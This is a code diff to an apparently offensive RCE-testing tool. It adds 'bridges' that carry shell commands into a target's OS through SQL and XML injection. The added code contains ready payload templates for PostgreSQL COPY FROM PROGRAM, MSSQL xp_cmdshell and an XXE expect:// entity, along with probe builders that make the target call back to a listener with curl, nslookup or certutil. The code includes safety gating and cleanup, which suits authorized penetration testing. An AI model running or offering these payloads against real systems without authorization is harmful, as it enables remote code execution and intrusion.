@@ -26,7 +26,7 @@ logger = logging.getLogger(__name__)
 
 # Bump on every change: PATCH for fixes, MINOR for new capabilities, MAJOR for
 # breaking changes to the CLI, output formats, or template schema.
-__version__ = "2.32.0"
+__version__ = "2.33.0"
 
 SAFETY_ORDER = {"safe": 0, "intrusive": 1, "stateful": 2}
 
@@ -209,6 +209,23 @@ def build_plain_request(text: str, scheme: Optional[str] = None
                if name.lower() not in {"host", "content-length"}]
     return (f"{scheme}://{host}{req['target']}", req["method"],
             req["body"] or None, headers)
+
+
+def parse_bridges(value: Optional[str]) -> Tuple[str, ...]:
+    """``--bridges`` -> the query-language bridges to ride, or ``()`` for none.
+
+    Off by default, and that is the design rather than caution: a bridge payload
+    is SQL or XML syntax, so on an ordinary shell sink it is a request that
+    cannot confirm. ``auto`` takes every bridge the corpus declares.
+
+    Raises ``ValueError`` naming the offending value -- a typo that silently
+    selected nothing would make a run that tested no bridge at all read exactly
+    like one that tested them and came back clean."""
+    if not value or value.strip().lower() in {"none", ""}:
+        return ()
+    if value.strip().lower() == "auto":
+        return ("auto",)
+    return tuple(part.strip().lower() for part in value.split(",") if part.strip())
 
 
 def parse_write_langs(value: Optional[str]) -> Optional[Tuple[str, ...]]:
@@ -439,6 +456,10 @@ class RCEKit:
         # Engine-specific wrappers for the `eval` arithmetic probe, declared in
         # the corpus so coverage can be extended without touching Python.
         self.eval_carriers: Dict[str, Dict[str, Any]] = {}
+        # Query-language carriers that hand a shell command to the OS. Declared
+        # in the corpus for the same reason eval_carriers are: coverage grows
+        # without touching Python.
+        self.bridges: Dict[str, Dict[str, Any]] = {}
         self._load_template_payloads()
 
         # Encoding and obfuscation techniques.
@@ -517,6 +538,7 @@ class RCEKit:
             self.payload_categories = data.get("payload_categories", {})
             self.detection_payloads = data.get("detection_payloads", {})
             self.eval_carriers = data.get("eval_carriers", {})
+            self.bridges = data.get("bridges", {})
         except Exception as exc:
             message = f"unable to parse {self.template_path}: {exc}"
             logger.error("%s", message)
@@ -540,6 +562,7 @@ class RCEKit:
             self.payload_categories = data.get("payload_categories", {})
             self.detection_payloads = data.get("detection_payloads", {})
             self.eval_carriers = data.get("eval_carriers", {})
+            self.bridges = data.get("bridges", {})
         except Exception as exc:  # pragma: no cover — a build-time guarantee
             message = f"unable to parse the built-in payload corpus: {exc}"
             logger.error("%s", message)
@@ -2425,13 +2448,22 @@ class RCEKit:
                         continue
                     verdict = meth.confirm_series(series)
                     probe = series[-1][0] if series else Probe(payload="", expected="")
-                    results.append({
+                    series_result = {
                         "verdict": verdict.status, "detail": verdict.evidence,
                         "status": None, "payload": probe.payload,
                         "method": meth.name, "tier": meth.tier,
                         "environment": record.environment, "context": record.context,
                         "category": "detection", "expected": probe.expected,
-                    })
+                    }
+                    # A stateful bridge creates a table, and an aggregate method
+                    # reports one row for a whole series -- so without this the
+                    # one oracle that reliably proves a query-language bridge
+                    # would be the one that never says how to clean up after it.
+                    cleanups = [p.followup["cleanup"] for p, _ in series
+                                if p.followup and p.followup.get("cleanup")]
+                    if cleanups:
+                        series_result["cleanup"] = "; ".join(dict.fromkeys(cleanups))
+                    results.append(series_result)
                     if max_payloads and len(results) >= max_payloads:
                         return results
                     continue
@@ -3355,6 +3387,68 @@ class DetectionMethod:
             payloads.append(self._wrap_context(record, body))
         return payloads
 
+    def _selected_bridges(self, sink_env: str) -> List[Tuple[str, Dict[str, Any]]]:
+        """``(name, bridge)`` for each selected bridge this dialect can carry.
+
+        A bridge declares the shell it reaches -- ``xp_cmdshell`` hands its
+        argument to cmd.exe, ``COPY FROM PROGRAM`` to /bin/sh -- so a bridge is
+        only offered a core written in its own dialect. Pairing them the other
+        way would send a POSIX ``$((a+b))`` into cmd.exe, which is precisely the
+        inert-text failure the dialect split exists to stop.
+
+        An unknown name is refused rather than dropped: narrowing a run to
+        nothing because of a typo would report a clean negative from a run that
+        rode no bridge at all."""
+        wanted = self.config.get("bridges") or ()
+        if not wanted:
+            return []
+        declared: Dict[str, Any] = getattr(self.gen, "bridges", None) or {}
+        if wanted == ("auto",):
+            names = list(declared)
+        else:
+            unknown = [name for name in wanted if name not in declared]
+            if unknown:
+                raise ValueError(f"unknown bridge(s): {', '.join(unknown)}; "
+                                 f"choose from auto, {', '.join(sorted(declared))}")
+            names = [name for name in wanted]
+        allowed = self.config.get("max_safety") or "intrusive"
+        out: List[Tuple[str, Dict[str, Any]]] = []
+        for name in names:
+            bridge = declared[name]
+            if (bridge.get("sink_env") or "unix") != sink_env:
+                continue
+            # A bridge that creates an object on the target is held to the same
+            # safety ordering as every stateful payload in the corpus, rather
+            # than riding in because a detection method built it.
+            if SAFETY_ORDER.get(bridge.get("safety") or "intrusive", 1) > SAFETY_ORDER.get(allowed, 1):
+                continue
+            out.append((name, bridge))
+        return out
+
+    def _bridge_variants(self, record: "PayloadRecord", core: str, sink_env: str,
+                         rng: "random.Random") -> List[Tuple[str, str, Optional[str]]]:
+        """``(bridge_name, payload, cleanup)`` for each selected bridge.
+
+        No separator: inside ``COPY … FROM PROGRAM '…'`` or ``xp_cmdshell '…'``
+        there is no running command to break out of, so the bare core is the
+        probe -- the raw rung, arrived at structurally rather than by flag.
+
+        The context still applies. A bridge supplies the query-language
+        structure; the record's context supplies the break-out into the query,
+        which is what makes ``--contexts sql`` and a bridge compose instead of
+        each reinventing the other."""
+        out: List[Tuple[str, str, Optional[str]]] = []
+        for name, bridge in self._selected_bridges(sink_env):
+            token = "".join(rng.choice(string.ascii_lowercase) for _ in range(8))
+            body = str(bridge.get("template", "")).replace("__CMD__", core)
+            body = body.replace("{token}", token)
+            if self._context_swallows(record, body):
+                continue
+            cleanup = bridge.get("cleanup")
+            cleanup = str(cleanup).replace("{token}", token) if cleanup else None
+            out.append((name, self._wrap_context(record, body), cleanup))
+        return out
+
     def _wrap(self, record: "PayloadRecord", core: str, sink_env: str = "unix",
               evade: bool = True) -> str:
         """The first :meth:`_wrap_variants` payload — one separator only.
@@ -3509,6 +3603,27 @@ class ReflectedMath(DetectionMethod):
             probes.extend(self._space_free_probes(record, a, b, total, t1, t2))
             if self._depth() != "quick":
                 probes.extend(self._extended_probes(record, a, b, total, t1, t2, t3, core))
+        probes.extend(self._bridge_probes(record, sink_env, rng, a, b, total, t1, t2))
+        return probes
+
+    def _bridge_probes(self, record: "PayloadRecord", sink_env: str, rng: "random.Random",
+                       a: int, b: int, total: int, t1: str, t2: str) -> List[Probe]:
+        """The arithmetic core carried into the OS through a query language.
+
+        Worth stating plainly: this is the weakest of the three oracles a bridge
+        can ride, because it needs the *output* of the program to reach the
+        response, and a statement injected alongside the application's own query
+        returns through a cursor the application never reads. It ships because
+        it costs one request and some drivers do return the last result set --
+        but `time` and `oob` are the bridge oracles that work with nothing
+        rendered, and the docs say so rather than leaving it to be discovered."""
+        core = (f"echo {t1}$(({a}+{b})){t2}" if sink_env != "windows"
+                else f'for /f "delims=" %i in (\'set /a {a}+{b}\') do @echo {t1}%i{t2}')
+        probes: List[Probe] = []
+        for name, payload, cleanup in self._bridge_variants(record, core, sink_env, rng):
+            probes.append(Probe(payload=payload, expected=f"{t1}{total}{t2}",
+                                forbidden=f"{a}+{b}", carrier=name, separator=None,
+                                followup={"cleanup": cleanup} if cleanup else None))
         return probes
 
     def _space_free_probes(self, record: "PayloadRecord", a: int, b: int, total: int,
@@ -3967,11 +4082,49 @@ class ParametricTime(DetectionMethod):
         probes += [Probe(payload=self._payload(record, base, sep, sink_env), expected="",
                          delay_s=base, separator=sep, phase="screen")
                    for sep in separators]
+        # A bridge is screened as its own "separator". COPY FROM PROGRAM and
+        # xp_cmdshell both block until the program exits, so the delay lands in
+        # the response exactly as a shell sleep does -- and unlike the
+        # arithmetic oracle this needs nothing rendered, which is what makes it
+        # the reliable way to prove a query-language bridge.
+        for name, _ in self._selected_bridges(sink_env):
+            for delay in (0.0, base):
+                payload = self._bridge_payload(record, delay, name, sink_env)
+                if payload is None:
+                    continue
+                probes.append(Probe(payload=payload, expected="", delay_s=delay,
+                                    separator=self.BRIDGE_PREFIX + name, phase="screen"))
         rng.shuffle(probes)
         return probes
 
+    # A separator label that names a bridge rather than a shell chainer. The
+    # regression has to rebuild the exact shape the screen found, and a bridge
+    # payload is built by a different path from a separator-led one, so the
+    # label carries which path to take instead of the two being told apart by
+    # guesswork.
+    BRIDGE_PREFIX = "bridge:"
+
+    def _bridge_payload(self, record: "PayloadRecord", delay: float, name: str,
+                        sink_env: str) -> Optional[str]:
+        """The sleep core carried through one named bridge, or ``None``.
+
+        The table name a stateful bridge generates is derived from the run's rng
+        rather than drawn fresh here, so the screen and the regression address
+        the same object instead of littering one table per probe."""
+        seeded = random.Random(f"{name}:{record.environment}:{record.context}")
+        for built_name, payload, _cleanup in self._bridge_variants(
+                record, self._sleep_core(delay, sink_env), sink_env, seeded):
+            if built_name == name:
+                return payload
+        return None
+
     def _payload(self, record: "PayloadRecord", delay: float, separator: Optional[str],
                  sink_env: str = "unix") -> str:
+        if separator and separator.startswith(self.BRIDGE_PREFIX):
+            built = self._bridge_payload(
+                record, delay, separator[len(self.BRIDGE_PREFIX):], sink_env)
+            if built is not None:
+                return built
         body = self._sleep_core(delay, sink_env)
         if separator is not None:
             body = f"{separator}{body}"
@@ -4310,6 +4463,43 @@ class OobCallback(DetectionMethod):
             add(lambda t: f"curl -s {url_for(t)}", "http/curl")
             if self._depth() != "quick":
                 add(lambda t: f"wget -q -O- {url_for(t)}", "http/wget")
+        probes.extend(self._bridge_probes(record, sink_env, rng, url_for, ip_host, host, listener))
+        return probes
+
+    def _bridge_probes(self, record: "PayloadRecord", sink_env: str, rng: "random.Random",
+                       url_for, ip_host: bool, host: str, listener) -> List[Probe]:
+        """A callback command carried into the OS through a query language.
+
+        The strongest bridge oracle. The arithmetic one needs the program's
+        output to reach the response -- a statement injected alongside the
+        application's own query returns through a cursor the application never
+        reads -- while a callback is made by the target itself and needs nothing
+        rendered at all."""
+        probes: List[Probe] = []
+        for name, _bridge in self._selected_bridges(sink_env):
+            shapes = [(lambda t: f"curl -s {url_for(t)}", "http/curl")]
+            if not ip_host:
+                shapes.append((lambda t: f"nslookup {t}.{host}", "dns/nslookup"))
+            if sink_env == "windows":
+                shapes = [(lambda t: f"certutil -urlcache -f {url_for(t)} %TEMP%\\{t}",
+                           "http/certutil")]
+            for core_for_token, label in shapes:
+                # A token per bridge *and* per shape: sharing one would mark
+                # every bridge confirmed as soon as any one of them called back.
+                token = self._token(rng)
+                for built, payload, cleanup in self._bridge_variants(
+                        record, core_for_token(token), sink_env, rng):
+                    if built != name:
+                        continue
+                    probes.append(Probe(payload=payload, expected=token, carrier=name,
+                                        separator=None,
+                                        followup={"cleanup": cleanup} if cleanup else None))
+                    self._shape[token] = f"{name}/{label}"
+                    if listener is not None:
+                        listener.tokens[token] = {
+                            "payload": payload, "category": "detection",
+                            "context": record.context,
+                        }
         return probes
 
     @staticmethod
@@ -5292,6 +5482,15 @@ def main():
                              "command; sq/dq break out of a surrounding quote; subshell reaches a "
                              "quoted value through $(...) and backticks without closing the quote. "
                              "Narrow it to cut request count once the sink's shape is known.")
+    parser.add_argument("--bridges", default=None, metavar="NAMES",
+                        help="(--methods) Query-language bridges to carry the command probes "
+                             "through: none (default), auto, or names from the corpus 'bridges' "
+                             "section. A bridge hands a shell command to the OS from inside a "
+                             "query language -- COPY FROM PROGRAM, xp_cmdshell, expect:// -- so "
+                             "reflected/time/oob prove execution through it with no new oracle. "
+                             "Off by default because a bridge payload is SQL or XML syntax: on an "
+                             "ordinary shell sink it is a request that cannot confirm. A stateful "
+                             "bridge also needs --verify-active-risk stateful.")
     parser.add_argument("--observe-url", default=None, metavar="URL",
                         help="(--methods) Second-order execution: an endpoint POLLED for the "
                              "computed value after the probes are sent. Use it when execution "
@@ -5399,6 +5598,7 @@ def main():
         sink_shapes = parse_sink_shapes(from_profile(args.sink_shape, "sink_shape"))
         sink_env = parse_sink_env(from_profile(args.sink_env, "sink_env"))
         write_langs = parse_write_langs(from_profile(args.write_lang, "write_lang"))
+        bridges = parse_bridges(from_profile(args.bridges, "bridges"))
     except ValueError as exc:
         print(f"[!] {exc}")
         return 1
@@ -5729,6 +5929,12 @@ def main():
                                 "observe_method": observe_method,
                                 "observe_data": observe_data,
                                 "observe_headers": observe_headers,
+                                "bridges": bridges,
+                                # The bridges honour the same safety ordering as
+                                # every corpus payload, so a stateful bridge is
+                                # held back by the same flag rather than riding
+                                # in because a detection method built it.
+                                "max_safety": verify_max_safety,
                                 "observe_poll": args.observe_poll,
                                 "observe_timeout": args.observe_timeout,
                                 "eval_engines": eval_engines,
@@ -5817,6 +6023,50 @@ def main():
                           f"the write is attempted at each of {len(injection_runs)} candidate "
                           "point(s). Narrow with -p/--max-points if that is more target state "
                           "than you intend to change.")
+            if bridges:
+                declared = getattr(generator, "bridges", None) or {}
+                if bridges == ("auto",):
+                    chosen = sorted(declared)
+                else:
+                    unknown = [name for name in bridges if name not in declared]
+                    if unknown:
+                        print(f"[!] Unknown --bridges: {', '.join(unknown)}. "
+                              f"Available: auto, {', '.join(sorted(declared))}.")
+                        return 1
+                    chosen = list(bridges)
+                held = [name for name in chosen
+                        if SAFETY_ORDER.get(declared[name].get("safety") or "intrusive", 1)
+                        > SAFETY_ORDER.get(verify_max_safety, 1)]
+                active = [name for name in chosen if name not in held]
+                print(f"[detect] query-language bridges: {', '.join(active) or 'none active'} "
+                      "-- the command probes are carried into the OS from inside a query "
+                      "language, so reflected/time/oob prove execution through them.")
+                for name in active:
+                    bridge = declared[name]
+                    needs = ", ".join(bridge.get("requires") or []) or "no stated prerequisite"
+                    print(f"[detect]   {name}: {bridge.get('sink_env', 'unix')} shell, "
+                          f"{bridge.get('safety', 'intrusive')} — needs {needs}")
+                    if bridge.get("cleanup"):
+                        print(f"[detect]     CREATES an object on the target; every finding "
+                              "lists the statement that removes it.")
+                if held:
+                    # Name the tier each one actually needs. Calling an
+                    # intrusive bridge stateful sends the operator to raise the
+                    # ceiling further than the run requires, which is the wrong
+                    # direction for a flag whose whole job is blast radius.
+                    by_tier: Dict[str, List[str]] = {}
+                    for name in held:
+                        by_tier.setdefault(
+                            declared[name].get("safety") or "intrusive", []).append(name)
+                    for tier in sorted(by_tier, key=lambda t: SAFETY_ORDER.get(t, 1)):
+                        why = ("they create an object on the target"
+                               if tier == "stateful" else "they execute a command on the target")
+                        print(f"[!] holding back {len(by_tier[tier])} {tier} bridge(s) "
+                              f"({', '.join(by_tier[tier])}); pass --verify-active-risk {tier} "
+                              f"to include them — {why}.")
+                if not active:
+                    print("[!] No bridge is active, so --bridges tested nothing. This is not a "
+                          "negative result.")
             if observe_url:
                 print(f"[detect] observing {observe_url} for second-order execution: polled every "
                       f"{args.observe_poll:g}s for up to {args.observe_timeout:g}s after the "
@@ -6737,6 +6987,50 @@ EMBEDDED_PAYLOAD_CORPUS = r"""
       "template": "[[${__EXPR__}]]",
       "notes": "Thymeleaf only evaluates an expression inside its inlining brackets; a bare ${a*b} in template text is emitted verbatim.",
       "verified": "thymeleaf 3.1.2: ${a*b} -> literal '${a*b}'; [[${a*b}]] -> '2070761401'. The __${...}__ preprocessing form was also tried and did NOT evaluate standalone, so it is deliberately not shipped."
+    }
+  },
+  "bridges": {
+    "postgres_copy_program": {
+      "engines": [
+        "postgresql"
+      ],
+      "sink_env": "unix",
+      "safety": "stateful",
+      "requires": [
+        "superuser, or a role in pg_execute_server_program"
+      ],
+      "template": "DROP TABLE IF EXISTS rk_{token}; CREATE TABLE rk_{token}(o text); COPY rk_{token} FROM PROGRAM '__CMD__'; SELECT o FROM rk_{token};",
+      "cleanup": "DROP TABLE IF EXISTS rk_{token};",
+      "notes": "COPY FROM PROGRAM runs its argument through /bin/sh on the database server, so a Unix command core rides it unchanged. It creates a table, which is why this bridge is stateful and carries its own DROP. The leading DROP IF EXISTS is not tidiness: the timing oracle fires the same bridge twice against one table name (0s then Ns), and without it the second CREATE fails, the statement aborts and the delay never happens -- the regression would then read as no delay on a target that is executing. The SELECT is there for the case where the driver returns the last result set to the application; do not rely on it. The reliable oracles here are time (the COPY blocks until the program exits) and oob (the program itself calls back), and both work with nothing rendered.",
+      "verified": "not validated against a live PostgreSQL here (no container runtime in the build environment); the syntax is PostgreSQL 9.3+ documented behaviour"
+    },
+    "mssql_xp_cmdshell": {
+      "engines": [
+        "mssql"
+      ],
+      "sink_env": "windows",
+      "safety": "intrusive",
+      "requires": [
+        "sysadmin, and xp_cmdshell enabled"
+      ],
+      "template": "EXEC master..xp_cmdshell '__CMD__';",
+      "cleanup": null,
+      "notes": "xp_cmdshell hands its argument to cmd.exe, so the command core must be the cmd.exe dialect -- a POSIX $((a+b)) is inert text there. Creates nothing, so there is nothing to clean up; it is intrusive rather than stateful because it executes a command, not because it leaves an object behind.",
+      "verified": "not validated against a live SQL Server here; documented behaviour of xp_cmdshell"
+    },
+    "xxe_expect": {
+      "engines": [
+        "php"
+      ],
+      "sink_env": "unix",
+      "safety": "intrusive",
+      "requires": [
+        "PHP with the expect extension loaded, and an XML parser with external entities enabled"
+      ],
+      "template": "<?xml version=\"1.0\"?><!DOCTYPE rk [<!ENTITY rk SYSTEM \"expect://__CMD__\">]><rk>&rk;</rk>",
+      "cleanup": null,
+      "notes": "The expect:// stream wrapper executes its URI through a shell and yields the output as the entity's value, so a document that renders the entity returns the command output directly. The extension is rarely installed, which is exactly why this is opt-in rather than part of a default run.",
+      "verified": "not validated here; documented behaviour of the PHP expect stream wrapper"
     }
   }
 }
